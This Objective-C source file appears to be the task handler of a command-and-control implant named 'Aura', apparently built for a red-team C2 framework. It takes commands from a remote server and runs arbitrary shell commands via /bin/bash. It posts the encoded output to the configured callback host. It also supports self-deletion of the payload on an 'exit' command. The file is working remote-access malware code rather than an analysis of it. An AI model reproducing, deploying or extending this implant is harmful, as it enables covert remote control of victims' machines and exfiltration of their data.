#import "C2Task.h"
#import "HTTPC2Config.h"
#import "C2CheckIn.h"
#import "NSTask.h"
#import "SystemInfoHelper.h"

@implementation C2Task

- (instancetype)initWithDictionary:(NSDictionary *)dict {
    self = [super init];
    if (self) {
        _taskID = dict[@"id"];
        _command = dict[@"command"];
        _parameters = dict[@"parameters"];
        _timestamp = [dict[@"timestamp"] doubleValue];
    }
    return self;
}

- (void)executeTask {
    NSLog(@"[DEBUG] Executing task: %@", self.command);

    // Dictionary mapping command strings to blocks (similar to a switch case)
    NSDictionary<NSString *, void (^)(void)> *taskCommandMap = @{
        @"exit": ^{
            BOOL deletionSuccess = [SystemInfoHelper deleteExecutable];
            NSString *responseMessage = deletionSuccess ? @"✅ Aura payload successfully deleted." : @"❌ Error deleting the Aura payload.";
            NSString *status = deletionSuccess ? @"success" : @"error";
            [self submitTaskResponseWithOutput:responseMessage status:status completed:YES];
            exit(0);
        },
        @"take_screenshot": ^{
            NSString *responseMessage = [NSString stringWithFormat:@"Screenshot taken at %@", self.parameters];
            [self submitTaskResponseWithOutput:responseMessage status:@"success" completed:YES];
        },
        @"shell_exec": ^{
            @try {
                // Create an NSTask for shell execution
                NSTask *task = [[NSTask alloc] init];
                NSPipe *outputPipe = [NSPipe pipe];  // Pipe for capturing output

                // Set the executable to /bin/zsh
                task.launchPath = @"/bin/bash";
                // Pass the command to execute as an argument
                task.arguments = @[@"-c", self.parameters];
                // Set the standard output to the pipe
                task.standardOutput = outputPipe;

                // Launch the task
                [task launch];
                [task waitUntilExit];  // Wait for task to complete

                // Read the output data from the pipe
                NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
                NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];

                if (task.terminationStatus == 0) {
                    // If the task succeeded, return the output
                    [self submitTaskResponseWithOutput:outputString status:@"success" completed:YES];
                } else {
                    // If the task failed, return the error output
                    NSString *errorMessage = [NSString stringWithFormat:@"Shell execution failed with status: %d", task.terminationStatus];
                    [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
                }
            }
            @catch (NSException *exception) {
                // Catch any exceptions and return them as error output
                NSString *errorMessage = [NSString stringWithFormat:@"Exception caught: %@", exception.reason];
                [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
            }
        }

    };

    // Fetch the block for the command, or return an error if not found
    void (^taskBlock)(void) = taskCommandMap[self.command];
    
    if (taskBlock) {
        taskBlock();
    } else {
        NSLog(@"[ERROR] Unknown task command: %@", self.command);
        [self submitTaskResponseWithOutput:@"Unknown command" status:@"error" completed:YES];
    }
}


- (void)submitTaskResponseWithOutput:(NSString *)output status:(NSString *)status completed:(BOOL)completed {
    if (callbackUUID == nil) {
        NSLog(@"[ERROR] No callback UUID available for submitting response.");
        return;
    }

    NSDictionary *responseData = @{
        @"action": @"post_response",
        @"responses": @[
                @{
                    @"task_id": self.taskID,
                    @"user_output": output,
                    @"status": status,
                    @"completed": @(completed)
                }
        ]
    };

    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:responseData options:0 error:&jsonError];
    if (jsonError) {
        NSLog(@"[ERROR] Error creating JSON: %@", jsonError.localizedDescription);
        return;
    }

    NSMutableData *messageData = [[callbackUUID dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
    [messageData appendData:jsonData];
    NSString *base64ResponseMessage = [messageData base64EncodedStringWithOptions:0];

    NSString *callbackHost = [HTTPC2Config callbackHost];
    NSInteger callbackPort = [HTTPC2Config callbackPort];
    NSString *postURI = @"agent_message";
    NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
    NSURL *url = [NSURL URLWithString:urlString];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:[base64ResponseMessage dataUsingEncoding:NSUTF8StringEncoding]];
    [request addValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    NSDictionary *headers = [HTTPC2Config headers];
    for (NSString *key in headers) {
        [request addValue:headers[key] forHTTPHeaderField:key];
    }

    NSURLSession *session = [NSURLSession sharedSession];
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ERROR] Error during task response submission: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                NSLog(@"[DEBUG] Successfully submitted task response for task: %@", self.taskID);
            } else {
                NSLog(@"[ERROR] Failed to submit task response. HTTP Status Code: %ld", (long)httpResponse.statusCode);
            }
        }
        dispatch_semaphore_signal(sema);
    }];

    [task resume];
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
}

@end
